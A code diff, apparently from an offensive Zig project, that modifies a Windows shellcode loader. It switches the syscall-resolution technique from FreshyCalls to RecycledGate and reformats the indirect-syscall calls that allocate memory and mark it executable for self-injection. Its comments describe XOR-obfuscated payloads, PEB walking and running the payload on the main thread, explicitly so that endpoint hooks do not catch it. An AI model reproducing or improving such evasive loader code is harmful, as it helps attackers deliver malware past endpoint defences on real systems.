@@ -1,7 +1,6 @@
 // hells gate shellcode loader. self-injection, per-build random xor key, peb walk.
-// FreshyCalls SSN resolution + indirect syscalls with random gadget pool.
-// execution: direct call on the main thread, then park forever.
-// no new thread, no APC — nothing for thread callbacks or APC hooks to catch.
+// RecycledGate syscall resolution, direct call on main thread, then park forever.
+
 const std = @import("std");
 const windows = std.os.windows;
 const nt = @import("nt.zig");
@@ -47,7 +46,7 @@ pub fn main() void {
     info("payload  : {d} bytes, {d}-byte xor key (per-build random)", .{ shellcode.len, key_bytes.len });
     info("delivery : self-inject, direct call on main thread + park", .{});
 
-    // resolve syscall SSNs and gadgets via peb walk + FreshyCalls.
+    // resolve syscall SSNs and gadgets via peb walk + RecycledGate.
     g_sys = syscall.Syscalls.resolve() orelse {
         err("failed to resolve syscalls", .{});
         return;
@@ -65,8 +64,8 @@ pub fn main() void {
     const status: windows.NTSTATUS = @enumFromInt(@as(u32, @truncate(syscall.syscall_dispatch(
         g_sys.NtAllocateVirtualMemory.number,
         &[_]usize{
-            @intFromPtr(current_process), @intFromPtr(&base_addr), 0,
-            @intFromPtr(&size), nt.MEM_COMMIT | nt.MEM_RESERVE, nt.PAGE_READWRITE,
+            @intFromPtr(current_process), @intFromPtr(&base_addr),        0,
+            @intFromPtr(&size),           nt.MEM_COMMIT | nt.MEM_RESERVE, nt.PAGE_READWRITE,
         },
         6,
     ))));
@@ -90,7 +89,8 @@ pub fn main() void {
         g_sys.NtProtectVirtualMemory.number,
         &[_]usize{
             @intFromPtr(current_process), @intFromPtr(&base_addr),
-            @intFromPtr(&size), nt.PAGE_EXECUTE_READ, @intFromPtr(&old_protect),
+            @intFromPtr(&size),           nt.PAGE_EXECUTE_READ,
+            @intFromPtr(&old_protect),
         },
         5,
     ))));
